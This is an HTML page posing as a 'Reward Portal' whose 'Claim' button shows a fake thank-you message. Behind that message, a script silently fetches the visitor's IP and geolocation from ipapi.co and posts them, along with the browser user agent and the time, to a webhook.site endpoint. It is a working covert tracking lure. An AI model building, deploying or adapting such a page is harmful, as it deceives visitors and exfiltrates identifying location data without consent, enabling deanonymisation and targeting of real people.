<!DOCTYPE html>
<html>
<head>
  <title>Reward Portal</title>
  <style>
    body { font-family: sans-serif; text-align: center; padding-top: 100px; background: #f0f0f0; }
    .box { background: white; display: inline-block; padding: 30px; border-radius: 12px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); }
    button { padding: 10px 20px; border: none; border-radius: 5px; background: #007bff; color: white; cursor: pointer; font-size: 16px; }
    button:hover { background: #0056b3; }
  </style>
</head>
<body>
  <div class="box" id="mainBox">
    <h2>Claim Your Reward</h2>
    <p>Click the button below to claim.</p>
    <button onclick="handleClaim()">Claim</button>
  </div>

  <script>
    async function handleClaim() {
      document.getElementById("mainBox").innerHTML = "<h2>Thank you!</h2><p>Your reward has been processed.</p>";

      try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();

        const payload = {
          ip: data.ip,
          city: data.city,
          region: data.region,
          country: data.country_name,
          org: data.org,
          ua: navigator.userAgent,
          time: new Date().toString()
        };

        await fetch('https://webhook.site/a902d0b3-80e2-4011-8022-54839963dc96', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });
      } catch (e) {
        console.error("Error sending data:", e);
      }
    }
  </script>
</body>
</html>
